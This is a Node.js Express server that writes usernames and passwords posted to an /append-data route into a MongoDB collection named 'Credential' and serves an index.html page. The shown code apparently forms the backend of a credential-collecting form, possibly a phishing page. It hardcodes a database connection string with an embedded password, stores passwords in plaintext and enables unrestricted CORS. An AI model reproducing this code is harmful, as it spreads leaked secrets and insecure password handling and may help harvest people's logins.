const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(express.json());
app.use(cors());


// MongoDB Connection (no deprecated options)
mongoose.connect('mongodb+srv://kotaking4489:FzQnJWrF0E0bTdpv@cluster0.zeqp1em.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
  .then(() => console.log('MongoDB Connected'))
  .catch(err => console.log(err));

// Schema & Model
const CredentialSchema = new mongoose.Schema({
  username: String,
  password: String
});
const Credential = mongoose.model('Credential', CredentialSchema);

// Route to handle form data
app.post('/append-data', async (req, res) => {
  try {
    const { username, password } = req.body;
    const newCredential = new Credential({ username, password });
    await newCredential.save();
    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false });
  }
});

app.use(express.static(path.join(__dirname, './')));

// Catch-all route to serve index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
  });
  
app.listen(3000, () => console.log('Server running on port 3000'));

// const express = require('express');
// const path = require('path');

// const app = express();

// app.use(express.static(__dirname));

// app.get('*', (req, res) => {
//   res.sendFile(path.join(__dirname, 'index.html'));
// });

// app.listen(3000, () => console.log('Running on 3000'));

